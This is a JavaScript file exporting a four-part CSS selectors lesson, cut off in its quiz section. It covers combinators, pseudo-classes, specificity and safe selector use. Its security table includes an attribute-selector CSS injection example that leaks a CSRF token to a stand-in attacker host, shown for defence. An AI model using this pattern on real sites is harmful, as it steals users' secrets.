export default "# CSS Selectors and Combinators\n\n*A four-part lesson. Running example: a \"selector lab\" page for Harbor Goods, a small online shop that sells outdoor and boating gear, where every rule you write targets a different part of the page.*\n\n---\n\n## Part 1 of 4: Selectors, the Building Blocks\n\n### 1.1 What a selector is\n\nA **selector** is the part of a CSS rule that says **which elements** the rule applies to. Everything else in CSS (colour, spacing, layout) is useless if the selector does not pick the right elements.\n\n```css\nnav .nav-list > li a[target=\"_blank\"]:hover::after {\n  content: \" ↗\";\n}\n```\n\nThat long selector reads, from right to left: \"the part just after (`::after`) a link (`a`) that is being hovered (`:hover`), has `target=\"_blank\"` (`[target=\"_blank\"]`), and sits inside an `<li>` that is a direct child (`>`) of something with class `nav-list`, all inside a `<nav>`.\"\n\n| Piece | Kind | Meaning |\n|---|---|---|\n| `nav` | Type selector | Any `<nav>` element |\n| (space) | Descendant combinator | \"somewhere inside\" |\n| `.nav-list` | Class selector | Elements with `class=\"nav-list\"` |\n| `>` | Child combinator | \"direct child of\" |\n| `li` | Type selector | Any `<li>` |\n| (space) | Descendant combinator | \"somewhere inside\" |\n| `a` | Type selector | Any `<a>` |\n| `[target=\"_blank\"]` | Attribute selector | Has that attribute and value |\n| `:hover` | Pseudo-class | While the pointer is over it |\n| `::after` | Pseudo-element | A generated part of the element |\n\n### 1.2 Vocabulary\n\nKnowing the names makes documentation and error messages easier to read.\n\n| Term | Meaning | Example |\n|---|---|---|\n| **Simple selector** | One single test | `p`, `.card`, `#logo`, `[type=\"email\"]`, `:hover` |\n| **Compound selector** | Several simple selectors **with no space between them**, all of which must match the **same** element | `a.button[target=\"_blank\"]:hover` |\n| **Combinator** | Describes the relationship between two compound selectors | space, `>`, `+`, `~` |\n| **Complex selector** | Compound selectors joined by combinators | `nav a`, `ul > li + li` |\n| **Selector list** | Several selectors separated by commas, sharing one rule | `h1, h2, h3` |\n| **Subject** | The element the rule actually styles: the **rightmost** compound selector | In `nav a`, the subject is the `<a>` |\n\n### 1.3 The four basic selectors\n\n| Selector | Syntax | Matches | Notes |\n|---|---|---|---|\n| **Type** (element) | `p`, `h2`, `li` | Every element of that name | Weak specificity; good for base styles |\n| **Universal** | `*` | Every element | No specificity; used in resets such as `*, *::before, *::after` |\n| **Class** | `.card` | Elements whose `class` list contains `card` | The workhorse: reusable and predictable |\n| **ID** | `#logo` | The element with `id=\"logo\"` | Very strong; avoid for styling, but good as a link target |\n\n```html\n<li class=\"product featured\" data-in-stock=\"true\">...</li>\n```\n\n```css\nli        { }  /* type */\n.product  { }  /* class: matches because \"product\" is in the class list */\n.featured { }  /* class: matches too; an element can have many classes */\n```\n\n### 1.4 Compound selectors: joining with no space\n\nWriting selectors **directly next to each other** means \"all of these on the same element\".\n\n| Selector | Means |\n|---|---|\n| `.product.featured` | An element with **both** classes |\n| `li.product` | An `<li>` that has class `product` (type plus class) |\n| `a[href^=\"https\"]:hover` | A link whose `href` starts with `https` **and** is being hovered |\n| `input:required:invalid` | An input that is required **and** currently invalid |\n\nOver-qualifying is a common habit worth avoiding. `div.card` and `ul.nav-list` add specificity and break the moment you change the element. Prefer `.card` and `.nav-list`.\n\n### 1.5 Selector lists and the \"all or nothing\" rule\n\nA comma lets you apply one rule to several selectors.\n\n```css\nh1,\nh2,\nh3 {\n  color: var(--blue);\n}\n```\n\nEach selector in the list is evaluated separately, and each keeps its own specificity.\n\nIn **traditional** CSS, if **one** selector in a list is invalid (a typo, or a feature the browser does not support), the browser **throws away the whole rule**, including the valid selectors.\n\n```css\nh2, :unknown-thing {     /* invalid selector in the list */\n  color: red;            /* the entire rule is ignored, h2 included */\n}\n```\n\nThe functional pseudo-classes `:is()` and `:where()` use a **forgiving** list: invalid items are skipped and the valid ones still work.\n\n```css\n:is(h2, :unknown-thing) {\n  color: red;            /* h2 still turns red */\n}\n```\n\nThis matters when you want to use a brand-new selector without breaking the old ones (see section 3.10).\n\n### 1.6 Attribute selectors\n\nAttribute selectors match elements by their attributes, with no extra class needed.\n\n| Selector | Matches | Example |\n|---|---|---|\n| `[attr]` | The attribute exists | `[disabled]` |\n| `[attr=\"value\"]` | Exactly equals the value | `[type=\"email\"]` |\n| `[attr~=\"value\"]` | The value is one **whole word** in a space-separated list | `[class~=\"card\"]` |\n| `[attr\\|=\"value\"]` | Equals `value`, or starts with `value-` | `[lang\\|=\"en\"]` matches `en` and `en-GB` |\n| `[attr^=\"value\"]` | Starts with | `a[href^=\"https\"]` |\n| `[attr$=\"value\"]` | Ends with | `a[href$=\".pdf\"]` |\n| `[attr*=\"value\"]` | Contains anywhere | `a[href*=\"harbor\"]` |\n| `[attr=\"value\" i]` | Case-**insensitive** match | `[type=\"EMAIL\" i]` |\n| `[attr=\"value\" s]` | Case-**sensitive** match | |\n\nNotes:\n\n- Quote the value (`[type=\"email\"]`). Quotes are required if the value has spaces or special characters.\n- `[class~=\"card\"]` is similar to `.card`, but `.card` is shorter and has the same specificity.\n- `^=`, `$=`, and `*=` with an **empty** value match nothing.\n- In HTML, some attribute values (such as `type`) are matched case-insensitively by default, while most others are case-sensitive, so use `i` or `s` when you want to be sure.\n- Attribute selectors are great for **state**: `[aria-current=\"page\"]`, `[aria-expanded=\"true\"]`, `[data-in-stock=\"false\"]`, `[hidden]`.\n\n### 1.7 Names, case, and special characters\n\n| Fact | Detail |\n|---|---|\n| Class and ID names | **Case-sensitive** in standards mode (`.Card` is not `.card`) |\n| Element and property names | Not case-sensitive for HTML, but write lowercase |\n| Valid characters | Letters, digits, hyphens, underscores; cannot start with a digit or two hyphens plus a digit, and a lone hyphen cannot stand alone |\n| Special characters (such as `:` or `/` in utility-class names like `md:flex`) | Must be **escaped** with a backslash: `.md\\:flex` |\n| Digits first (`id=\"1st\"`) | Must be written as `#\\31 st`; easier to avoid |\n\nGood naming: describe **purpose** (`.warning`, `.product-card`), use lowercase with hyphens, and stay consistent. A popular convention is **BEM** (Block, Element, Modifier): `.card`, `.card__title`, `.card--featured`. You do not have to use it, but one consistent system saves arguments.\n\n**Part 1 summary.** You can break a selector into its parts, use the correct vocabulary, write type, universal, class, ID, compound, list, and attribute selectors, understand why one invalid selector can kill a whole rule, and name classes well.\n\n---\n\n## Part 2 of 4: Combinators and Pseudo-selectors\n\n### 2.1 The four combinators\n\nA **combinator** says how two elements are related in the HTML tree.\n\n| Combinator | Symbol | Meaning | Example |\n|---|---|---|---|\n| **Descendant** | space | Anywhere **inside** | `nav a` |\n| **Child** | `>` | A **direct** child only | `ul > li` |\n| **Next sibling** (adjacent) | `+` | The element **immediately after** | `h2 + p` |\n| **Subsequent sibling** (general) | `~` | **Any later** sibling (same parent) | `h2 ~ p` |\n\n(There is also a **column combinator**, `||`, for table columns. It is rare and has limited support, so you can skip it for now.)\n\n### 2.2 The family tree\n\nCombinators are about relationships in the DOM tree, so draw it. Here is a piece of the Harbor Goods product list:\n\n```text\nsection#products\n├── h2\n├── p.lead\n├── p\n└── ul.product-list\n    ├── li.product            <- child of ul\n    │   ├── h3\n    │   ├── p.price\n    │   ├── ul.features       <- child of li.product\n    │   │   ├── li            <- child of ul.features, DESCENDANT of ul.product-list\n    │   │   └── li\n    │   └── p.note\n    └── li.product.featured\n        ├── h3\n        └── p.price\n```\n\n| Relationship | Terms | Example from the tree |\n|---|---|---|\n| Parent and child | One level apart | `ul.product-list` is the parent of each `li.product` |\n| Ancestor and descendant | Any number of levels | `ul.product-list` is an ancestor of `ul.features li` |\n| Siblings | Same parent | `h2`, `p.lead`, `p`, `ul.product-list` are siblings |\n\n### 2.3 Descendant combinator (a space)\n\n```css\n.product-list li { border-left: 4px solid gold; }\n```\n\nMatches **every** `<li>` anywhere inside `.product-list`, however deep. In the tree above, that includes the four `li.product` **and** the three nested `li` inside `.features`: seven elements. This is a classic surprise.\n\n### 2.4 Child combinator (`>`)\n\n```css\n.product-list > li { border-left: 4px solid gold; }\n```\n\nMatches only `<li>` elements that are **direct children** of `.product-list`: the four products, not the nested feature items. Use `>` when you want to avoid leaking styles into nested content, such as nested menus and lists.\n\n### 2.5 Adjacent sibling combinator (`+`)\n\n```css\nh3 + .price { font-size: 1.25rem; }\n.lead + p   { margin-top: 0; }\n```\n\n`A + B` matches `B` only if it comes **immediately** after `A` and they share a parent. Text nodes and comments are ignored, but other elements are not. In the tree, `h3 + .price` matches each price (it comes right after the `h3`), but `h3 + .note` would match nothing, because other elements sit in between.\n\n### 2.6 General sibling combinator (`~`)\n\n```css\n.lead ~ p { color: #444; }\n```\n\n`A ~ B` matches **every** `B` that comes **after** `A` among the same parent's children (not just the next one). In the tree, `.lead ~ p` matches the plain `<p>` after `.lead`. The `<ul>` is also a later sibling, but it is not a `<p>`, so it is not matched.\n\nImportant: sibling combinators only look **forward** (later siblings). CSS cannot select a previous sibling using `+` or `~`, but `:has()` can do that job now (section 3.1).\n\n### 2.7 A space (or not) changes everything\n\nThe same two class names can mean four different things:\n\n| Selector | Meaning |\n|---|---|\n| `.product.featured` | One element with **both** classes (no space) |\n| `.product .featured` | A `.featured` **inside** a `.product` (descendant) |\n| `.product > .featured` | A `.featured` that is a **direct child** of a `.product` |\n| `.product, .featured` | **Either** (two separate selectors) |\n\nIn the Harbor Goods page, `li.product.featured` matches the bag. But `.product .featured` matches **nothing**, because no `.featured` sits inside a `.product`. Many \"my CSS does not work\" problems are an accidental space.\n\n### 2.8 Reading selectors right to left\n\nBrowsers evaluate the **rightmost** part first, then check the rest by walking up the tree. You can read selectors the same way.\n\n```css\nnav ul li a { }\n```\n\n1. \"Find every `<a>`\" (the subject)\n2. \"that is inside an `<li>`\"\n3. \"that is inside a `<ul>`\"\n4. \"that is inside a `<nav>`\"\n\nEvery extra link in the chain makes a selector more fragile (the HTML must keep that exact shape) and, for descendant chains, a little more costly to check. Two or three parts is plenty for most rules.\n\n### 2.9 Useful combinator patterns\n\n| Pattern | Use | Example |\n|---|---|---|\n| `* + *` (\"lobotomised owl\") | Space between **all** siblings except the first | `.stack > * + * { margin-top: 1rem; }` |\n| `li + li` | Separator between list items, not before the first | `.breadcrumb li + li::before { content: \"/\"; }` |\n| `h2 + p` | Tighten the first paragraph after a heading | `h2 + p { margin-top: 0; }` |\n| `.card > :first-child` | Remove top margin from the first child | `.card > :first-child { margin-top: 0; }` |\n| `.menu > li > a` | Style only top-level links, not submenu links | |\n| `label + input` | Style a field right after its label | |\n| `input:checked + label` | Style a label by the state of the preceding checkbox | `input:checked + label { font-weight: 700; }` |\n\n(`gap` in flexbox and grid often replaces the spacing patterns, so use it when you have a flex or grid container.)\n\n### 2.10 Pseudo-classes: selecting by state or position\n\nA **pseudo-class** starts with **one colon** and selects an element in a particular **state** or **position**, without any extra markup.\n\n**User-action pseudo-classes**\n\n| Pseudo-class | Applies when | Notes |\n|---|---|---|\n| `:hover` | The pointer is over the element | Touch screens have no true hover, so never hide essential content behind it |\n| `:active` | The element is being pressed | |\n| `:focus` | The element has keyboard focus | Matches mouse clicks on inputs too |\n| `:focus-visible` | The browser decides a focus ring is helpful | Best for focus styling: shows for keyboard focus, usually not for mouse clicks on buttons |\n| `:focus-within` | The element **or any descendant** has focus | Highlight a whole form row or card |\n\n**Link pseudo-classes**\n\n| Pseudo-class | Meaning |\n|---|---|\n| `:link` | An unvisited link (`<a href>`) |\n| `:visited` | A visited link (styling is deliberately restricted for privacy, see section 3.8) |\n| `:any-link` | Either of the above |\n\nIf you style all four link states separately, equal specificity means **order matters**: use **L**ink, **V**isited, **H**over, **A**ctive (the \"LVHA\" order).\n\n**Structural pseudo-classes**\n\n| Pseudo-class | Matches |\n|---|---|\n| `:root` | The document root (`<html>`); often used for CSS variables |\n| `:first-child`, `:last-child` | An element that is the first or last child of its parent |\n| `:only-child` | An element that is the only child |\n| `:first-of-type`, `:last-of-type` | First or last of its **element type** among siblings |\n| `:nth-child(n)` | The nth child (counting from **1**) |\n| `:nth-last-child(n)` | The nth child, counting from the end |\n| `:nth-of-type(n)` | The nth sibling **of the same element type** |\n| `:empty` | No children at all, including text (whitespace in the source counts in current browsers) |\n\n`:nth-child()` takes a number, a keyword, or a formula `an+b` (n counts 0, 1, 2, 3...):\n\n| Written | Matches |\n|---|---|\n| `:nth-child(3)` | Only the third child |\n| `:nth-child(odd)` or `2n+1` | 1st, 3rd, 5th... |\n| `:nth-child(even)` or `2n` | 2nd, 4th, 6th... |\n| `:nth-child(3n)` | 3rd, 6th, 9th... |\n| `:nth-child(n+3)` | 3rd child and every later one |\n| `:nth-child(-n+3)` | The first three only |\n| `:nth-last-child(-n+2)` | The last two |\n\n**`:first-child` versus `:first-of-type`:** `p:first-child` means \"a `<p>` that is the very first child of its parent\". `p:first-of-type` means \"the first `<p>` among its siblings, even if other elements come before it\". In `<div><h2>..</h2><p>..</p></div>`, the `<p>` is `:first-of-type` but not `:first-child`.\n\n**Form and input pseudo-classes**\n\n| Pseudo-class | Matches |\n|---|---|\n| `:enabled`, `:disabled` | Controls that can or cannot be used |\n| `:required`, `:optional` | Controls with or without `required` |\n| `:checked` | Ticked checkboxes and radios, selected options |\n| `:indeterminate` | Checkboxes in an in-between state |\n| `:valid`, `:invalid` | Controls passing or failing built-in validation |\n| `:in-range`, `:out-of-range` | Numbers and dates within or outside `min` and `max` |\n| `:read-only`, `:read-write` | Fields that cannot or can be edited |\n| `:placeholder-shown` | An input currently showing its placeholder (it is empty) |\n| `:user-invalid`, `:user-valid` | Like `:invalid` and `:valid`, but only **after** the user has interacted (newer; check browser support) |\n\nA required empty field is `:invalid` the moment the page loads, so a red border straight away is annoying. This pattern waits until the user has typed:\n\n```css\ninput:required:invalid:not(:placeholder-shown) {\n  border-color: #b00020;\n}\n```\n\n(This needs a `placeholder` attribute on the input. `:user-invalid` is the cleaner modern option where supported.)\n\n**Other useful pseudo-classes**\n\n| Pseudo-class | Matches |\n|---|---|\n| `:target` | The element whose `id` matches the page's `#fragment` (for example after clicking `href=\"#faq\"`) |\n| `:lang(fr)` | Elements in a given language |\n| `:dir(rtl)` | Elements with a given text direction |\n| `:defined`, `:fullscreen`, `:modal` | More specialised states |\n\n### 2.11 Pseudo-elements: selecting parts of an element\n\nA **pseudo-element** starts with **two colons** and selects a **part** of an element, or creates one.\n\n| Pseudo-element | Selects | Notes |\n|---|---|---|\n| `::before` | A generated box **before** the element's content | Needs the `content` property |\n| `::after` | A generated box **after** the content | Needs `content` |\n| `::first-line` | The first formatted line of a block | Only some properties are allowed |\n| `::first-letter` | The first letter (drop caps) | Only some properties are allowed |\n| `::marker` | The bullet or number of a list item | Limited properties (colour, size, content) |\n| `::placeholder` | The placeholder text in an input | Keep contrast sufficient |\n| `::selection` | Text highlighted by the user | Limited properties; keep readable contrast |\n| `::backdrop` | The backdrop behind a `<dialog>` shown modally or a fullscreen element | |\n| `::file-selector-button` | The button inside `<input type=\"file\">` | |\n\n```css\n.lead::first-letter { font-size: 1.6em; font-weight: 700; }\n.features li::marker { color: gold; }\na[target=\"_blank\"]::after { content: \" \\2197\"; }   /* a north-east arrow */\n```\n\nRules and warnings:\n\n- Use **two colons** (`::before`). The old single-colon forms `:before`, `:after`, `:first-line`, and `:first-letter` still work for historical reasons, but write the modern form.\n- An element can have only **one** `::before` and **one** `::after`. A second rule for the same pseudo-element competes with the first (the more specific or later one wins).\n- Generated content is **not part of the DOM**: users cannot select it, and screen readers may skip or read it inconsistently. Use it only for **decoration**. Put real information in the HTML.\n- Pseudo-elements cannot be combined with other pseudo-elements (`::before::after` is invalid) and cannot be targeted from JavaScript with `querySelector`.\n- Void elements such as `<img>` and `<input>` generally cannot have `::before` or `::after`.\n\n**Pseudo-class or pseudo-element?** If it describes **a state of the element** (hovered, checked, first child), it is a pseudo-class with one colon. If it describes **a part of the element** (the first line, the marker, the placeholder), it is a pseudo-element with two colons.\n\n**Part 2 summary.** You can use all four combinators, read selectors right to left, tell `.a.b`, `.a .b`, `.a > .b`, and `.a, .b` apart, use the main pseudo-classes (user action, link, structural, form, target), write `:nth-child` formulas, and use pseudo-elements for decoration.\n\n---\n\n## Part 3 of 4: Advanced Selectors, Specificity, and Good Practice\n\n### 3.1 Logical pseudo-classes: `:not()`, `:is()`, `:where()`, `:has()`\n\n| Pseudo-class | Purpose | Specificity | Example |\n|---|---|---|---|\n| `:not(S)` | Matches elements that do **not** match `S` | That of its **most specific** argument | `.product:not(.featured)` |\n| `:is(S1, S2)` | Matches if the element matches **any** of the list; shortens long selectors | That of its **most specific** argument | `:is(h1, h2, h3) a` |\n| `:where(S1, S2)` | Same as `:is()`, but with **zero specificity** | **0** | `:where(.card, .panel) p` |\n| `:has(S)` | Matches an element **that contains** (or is followed by) something matching `S`, the \"parent selector\" | That of its **most specific** argument | `.product:has(.note)` |\n\n**`:is()` makes long selectors shorter.** Without it:\n\n```css\nheader a:hover, nav a:hover, footer a:hover { }\n```\n\nWith it:\n\n```css\n:is(header, nav, footer) a:hover { }\n```\n\n**`:where()` is for easy-to-override defaults.** Because it adds no specificity, any later class will beat it:\n\n```css\n:where(.prose) a { color: blue; }      /* specificity (0,0,1) */\n.button a        { color: white; }     /* wins easily */\n```\n\nLibrary and base-style authors use it so users can override without a specificity fight.\n\n**`:has()` is the long-awaited parent (and previous sibling) selector.**\n\n```css\n.product:has(.note)            { border-color: gold; }       /* a card that contains a .note */\n.product:has(> .features)      { padding-bottom: 1.5rem; }   /* has a direct .features child */\nform:has(input:invalid)        { outline: 2px dashed #b00020; }\nlabel:has(+ input:required)::after { content: \" *\"; }        /* label followed by a required input */\nsection:has(h2 + p) { }                                      /* contains an h2 immediately followed by a p */\n```\n\nCautions for `:has()`:\n\n- It is supported in current browsers, but check support if you must serve older ones (see section 3.10).\n- It cannot be nested inside another `:has()`, and cannot contain pseudo-elements.\n- Broad uses such as `body:has(...)` or `*:has(...)` on very large pages can be expensive. Keep the scope narrow.\n\n**`:not()` tips:** `:not(.a):not(.b)` means \"not `.a` and also not `.b`\". `:not(.a, .b)` means \"not `.a` and not `.b`\" too (a list inside `:not` excludes anything that matches any item).\n\n### 3.2 CSS nesting\n\nModern CSS lets you **nest** rules inside each other, much as preprocessors (Sass) did. The `&` stands for the parent selector.\n\n```css\n.card {\n  padding: 1rem;\n  border: 1px solid var(--border);\n\n  & h3 { color: var(--blue); }          /* .card h3 */\n  &:hover { box-shadow: 0 2px 8px rgb(0 0 0 / .15); }   /* .card:hover */\n  &.featured { border-color: gold; }    /* .card.featured (no space) */\n  .sidebar & { padding: .5rem; }        /* .sidebar .card (parent comes after) */\n\n  @media (min-width: 48rem) {\n    padding: 2rem;\n  }\n}\n```\n\n| Fact | Detail |\n|---|---|\n| `&` | Refers to the parent selector; **no space** before a suffix (`&.featured`, `&:hover`) joins them on the same element |\n| Starting a nested selector with a type name | Works in current browsers; to support older ones, write `& h3` |\n| Specificity | `&` behaves like `:is(parent selectors)`, so it takes the parent's **most specific** selector |\n| Support | Current browsers; check support if you must serve older ones, or compile with a tool |\n| Risk | Deep nesting recreates long, brittle selectors, so keep it **one or two levels deep** |\n\n### 3.3 Specificity: who wins?\n\nWhen several rules set the same property on the same element, the browser decides in this order:\n\n1. **Importance** (`!important` beats normal; transitions and animations have their own rules)\n2. **Layers** (rules in `@layer` blocks; **unlayered** styles beat layered ones for normal declarations)\n3. **Specificity**\n4. **Source order** (the later rule wins when everything else is equal)\n\n**Calculating specificity.** Count three numbers, written **(a, b, c)**:\n\n| Column | Counts |\n|---|---|\n| **a** | ID selectors (`#logo`) |\n| **b** | Class selectors, attribute selectors, pseudo-classes (`.card`, `[type=\"email\"]`, `:hover`) |\n| **c** | Type selectors and pseudo-elements (`p`, `::before`) |\n\nThe universal selector `*` and combinators (`>`, `+`, `~`, space) add **nothing**. Inline `style=\"...\"` beats all of these (it is above the scale).\n\n| Selector | Specificity (a, b, c) |\n|---|---|\n| `*` | (0, 0, 0) |\n| `p` | (0, 0, 1) |\n| `nav a` | (0, 0, 2) |\n| `p::first-line` | (0, 0, 2) |\n| `.card` | (0, 1, 0) |\n| `[type=\"email\"]` | (0, 1, 0) |\n| `a:hover` | (0, 1, 1) |\n| `.product-list > li a` | (0, 1, 2) |\n| `li.product.featured` | (0, 2, 1) |\n| `#products .card h3` | (1, 1, 1) |\n| `#logo` | (1, 0, 0) |\n| `:not(.featured)` | (0, 1, 0) |\n| `:is(#a, .b) p` | (1, 0, 1) |\n| `:where(#a, .b) p` | (0, 0, 1) |\n| `li:has(> a.active)` | (0, 1, 2) (`:has()` takes its argument's `a.active` = (0,1,1), plus `li`) |\n| `.item:nth-child(2)` | (0, 2, 0) |\n\n**Compare column by column, left to right.** It is **not** a decimal number. (0, 11, 0) does **not** beat (1, 0, 0): a single ID outranks any number of classes. Only if the first column ties does the second column decide, and so on.\n\n**Worked example**\n\n```html\n<li class=\"product featured\"><h3>Dry Bag</h3></li>\n```\n\n```css\nh3 { color: black; }                    /* (0,0,1) */\n.product h3 { color: blue; }            /* (0,1,1) */\nli.featured h3 { color: green; }        /* (0,1,2) */\n.product.featured h3 { color: crimson; }/* (0,2,1) -> WINS */\n```\n\nThe heading is crimson, because (0,2,1) is higher than (0,1,2) in the second column. The order in the file does not matter, since the specificity differs.\n\n**Habits that keep specificity under control**\n\n| Do | Avoid |\n|---|---|\n| Style with **single classes** (0,1,0) | IDs for styling |\n| Keep selectors **short** (one to three parts) | Chains like `body div.main ul li a span` |\n| Order rules from general to specific (base, layout, components, states) | Fighting a high-specificity rule with an even higher one |\n| Use `:where()` for defaults you expect others to override | `!important` as a first resort |\n| Use `@layer` to control order in larger projects | Over-qualifying (`div.card`, `ul.menu`) |\n| Check **Styles** in developer tools when something \"does not work\" | Guessing |\n\n**`!important`** reverses the normal order and escapes specificity. Use it only as a last resort (for example, to override a third-party style you cannot edit, or for a utility class like `.visually-hidden`). Later fixes then need an even more forceful `!important`.\n\n### 3.4 Choosing good selectors\n\n| Situation | Prefer | Instead of |\n|---|---|---|\n| Reusable component | `.card`, `.card__title` | `div > div > h3` |\n| State of a component | `[aria-expanded=\"true\"]`, `[aria-current=\"page\"]`, `[data-state=\"open\"]`, `.is-open` | A new unrelated class for each look |\n| Highlight \"required\" inputs | `input:required` | `.required-input` classes you must remember to add |\n| Space between siblings | `gap` (in flex or grid) or `* + *` | Manual margins on every item |\n| First and last item tweaks | `:first-child`, `:last-child` | Extra classes in the HTML |\n| Hook for JavaScript only | `data-*` attribute or a `js-` class | Styling classes (so a design change does not break behaviour) |\n| Styling a parent by its children | `:has()` | JavaScript that adds classes |\n| Links to files | `a[href$=\".pdf\"]` | A manual class on every PDF link |\n\n**Tie states to real attributes** when you can. If a button controls a menu with `aria-expanded`, style on `[aria-expanded=\"true\"]` and the visual and the accessibility state can never disagree.\n\n### 3.5 Selector performance\n\nBrowsers match selectors **right to left**, and CSS matching is very fast. On normal pages, selector performance is **rarely** a bottleneck, and readability matters more. Sensible habits:\n\n- Keep selectors short and flat.\n- Avoid very broad `:has()` such as `body:has(...)` on huge pages.\n- Avoid pointless universal selectors deep in chains (`.a * * * p`).\n- Measure before optimising, using the browser's **Performance** panel.\n\n### 3.6 Selectors in JavaScript\n\nThe same selector syntax is used in JavaScript, so everything you learn applies there.\n\n| Method | Returns |\n|---|---|\n| `document.querySelector(sel)` | The **first** matching element, or `null` |\n| `document.querySelectorAll(sel)` | A static list of **all** matches |\n| `element.querySelector(sel)` | The first match **inside** that element |\n| `element.matches(sel)` | `true` if this element matches the selector |\n| `element.closest(sel)` | The nearest ancestor (or the element itself) that matches, or `null` |\n| `CSS.escape(str)` | Escapes a string so it is safe to use inside a selector |\n| `CSS.supports(\"selector(:has(a))\")` | Tests whether the browser supports a selector |\n\n```javascript\nconst bag = document.querySelector(\".product.featured\");\nbag.matches(\".product\");                          // true\nconst item = document.querySelector(\".features li\");\nitem.closest(\".product\").querySelector(\"h3\");     // the heading of the card containing this item\n```\n\nIn the browser **Console**, two shortcuts exist: `$(sel)` for `querySelector`, and `$$(sel)` for `querySelectorAll` (returned as an array). They are perfect for testing a selector before putting it in your stylesheet.\n\n**Never build a selector from untrusted text** without escaping, because special characters can change its meaning or throw an error:\n\n```javascript\n// Risky: userInput might contain characters like ] or \", or be an invalid selector\ndocument.querySelector(\"#\" + userInput);\n\n// Safer: escape it\ndocument.querySelector(\"#\" + CSS.escape(userInput));\n```\n\nAn invalid selector makes `querySelector` throw a `SyntaxError`, which can break your script, so wrap uncertain selectors in `try...catch`.\n\n### 3.7 Accessibility and selectors\n\n| Practice | Why |\n|---|---|\n| Style `:focus-visible` clearly, and **never** remove focus outlines without a replacement | Keyboard users need to see where they are |\n| Do not hide essential content or controls behind `:hover` alone | Touch and keyboard users cannot hover |\n| Provide `:focus` or `:focus-visible` styles wherever you provide `:hover` | Same information for keyboard users |\n| Use `:focus-within` to highlight the active form group or widget | Helps people track their place |\n| Style states from ARIA and native attributes (`[aria-expanded]`, `[aria-current]`, `:checked`, `:disabled`) | Visual and assistive-technology state stay in sync |\n| Keep contrast for `:disabled`, `::placeholder`, and `::selection` | Low-contrast states are hard to read |\n| Do not put important text in `::before` and `::after` | Not reliably read, and not selectable |\n| Avoid `display: none` or `visibility: hidden` on content a screen reader user needs | They remove it from assistive technology |\n| Do not use `:nth-child` and `order` tricks that make visual order differ from DOM order | Keyboard and reading order follow the HTML |\n| Do not rely on colour alone for `:invalid`, `:required`, or error states | Add text, icons, or patterns |\n\n### 3.8 Security and privacy\n\n| Risk | What happens | Safer habit |\n|---|---|---|\n| **CSS injection and data exfiltration with attribute selectors** | If an attacker can inject CSS into your page, rules such as `input[name=\"csrf\"][value^=\"a\"] { background: url(https://evil.example/?a) }` make the browser send requests that reveal a secret one character at a time | Never insert untrusted input into `<style>` blocks or `style` attributes; do not put secrets in attributes (including hidden-input values); set a strict Content Security Policy (`style-src`, `img-src`, `font-src`, `connect-src`) |\n| **Building selectors from user input in JavaScript** | Special characters change the meaning or throw errors | `CSS.escape()` and `try...catch`; prefer `getElementById` or `dataset` lookups for known values |\n| **`:visited` history sniffing** | Old browsers let sites detect which links you had visited by checking styles | Browsers now **restrict** what `:visited` can change (mainly colours, with alpha ignored) and lie to scripts about computed styles; do not try to work around it |\n| **Treating CSS as a security boundary** | `[data-role=\"admin\"] { display: none }` only hides things; the content is still in the page | Authorisation must happen on the **server**; never rely on CSS to hide sensitive data |\n| **Third-party stylesheets** | An external stylesheet can restyle your page and see who loads it | Host your own, pin versions, use Subresource Integrity (`integrity` with `crossorigin=\"anonymous\"`) |\n| **Deceptive styling (UI redressing)** | `:hover`, `::before`, and positioning can make fake buttons or hide warnings | Review any user-supplied styling, keep critical security UI out of reach of untrusted content |\n\n### 3.9 Debugging selectors\n\n| Problem | How to investigate |\n|---|---|\n| A rule has no effect | In **Elements** > **Styles**, is it listed? If not, the selector does not match (typo, extra space, wrong class). If it is **crossed out**, something with higher specificity or a later rule overrides it |\n| Not sure what a selector matches | In the **Console**, run `$$(\"your selector\")` and check the count and the elements (hover them in the console to highlight on the page) |\n| The rule affects too many elements | Descendant space instead of `>`; broad type selector; nested list leaking styles |\n| The rule affects nothing | A space between classes that should be joined (`.a .b` vs `.a.b`); class name case or typo; element is added later by JavaScript |\n| A whole rule vanishes | An invalid selector in a comma list (use `:is()` to be forgiving), or a syntax error above it (missing brace or semicolon) |\n| `:hover` or `:focus` styles not showing | In **Styles**, use the **:hov** panel to force states |\n| Specificity confusion | Hover over a selector in the Styles pane (some browsers show its specificity), or compute (a, b, c) by hand |\n| A new selector works in one browser only | Check support on MDN, and use `@supports selector(...)` |\n| The rule applies in DevTools but not on reload | The change was only in the live DevTools edit; copy it into your file |\n\n### 3.10 Browser support and progressive enhancement\n\nNewer selectors (`:has()`, `:user-invalid`, nesting, and others) are supported in current browsers, but you should check MDN or Can I Use for your audience. To use a modern selector safely, write a **safe default first**, then enhance with `@supports`:\n\n```css\n/* Default for all browsers */\n.product { border: 1px solid var(--border); }\n\n/* Enhancement only where :has() is supported */\n@supports selector(:has(a)) {\n  .product:has(.note) { border-color: gold; }\n}\n```\n\nBecause an invalid selector would otherwise discard the whole rule, `@supports selector()` (or the forgiving `:is()`) stops a new feature from breaking old browsers.\n\n### 3.11 Common mistakes\n\n| Mistake | Better approach |\n|---|---|\n| An accidental space (`.card .featured` when you meant `.card.featured`) | Decide: same element (no space) or descendant (space) |\n| `ul li` styling nested lists too | Use `ul > li` |\n| Over-qualifying (`div.card`, `ul.nav-list`, `a.button`) | Use `.card`, `.nav-list`, `.button` |\n| Long descendant chains | Short, flat class selectors |\n| Using IDs for styling | Classes (and keep IDs for anchors and labels) |\n| Trying to win with `!important` | Understand and fix the specificity |\n| Thinking `+` selects the previous sibling | It only looks forward; use `:has()` for backward relationships |\n| Confusing `:first-child` with `:first-of-type` | Re-read the definitions and test in the Console |\n| Expecting `:nth-child` to count only matching elements | It counts **all** siblings; `:nth-of-type` counts by element type |\n| `:hover` without `:focus-visible` | Style both |\n| Single colon for pseudo-elements (`:before`) | Use `::before`, `::after` |\n| Forgetting `content` on `::before` and `::after` | They do nothing without it |\n| Putting meaningful text in generated content | Put it in the HTML |\n| One bad selector in a comma list killing the rule | Separate rules, or use `:is()` |\n| Quoting mistakes in attribute selectors | `[type=\"email\"]` |\n| Building JS selectors from raw user input | `CSS.escape()` |\n| Deep nesting in CSS nesting or Sass | One or two levels |\n| Targeting presentation-based class names (`.red-text`) | Purpose-based names |\n\n**Part 3 summary.** You can use `:not()`, `:is()`, `:where()`, and `:has()`, write nested CSS, calculate specificity and predict winners, choose maintainable selectors, use selectors safely in JavaScript, apply accessibility and security practices, debug with the Styles panel and the Console, and use `@supports` for progressive enhancement.\n\n---\n\n## Part 4 of 4: Check Your Understanding and Practice\n\n### Section A: Questions and answers\n\n**Q1. Break `nav a:hover` into its parts and name each one. What is the 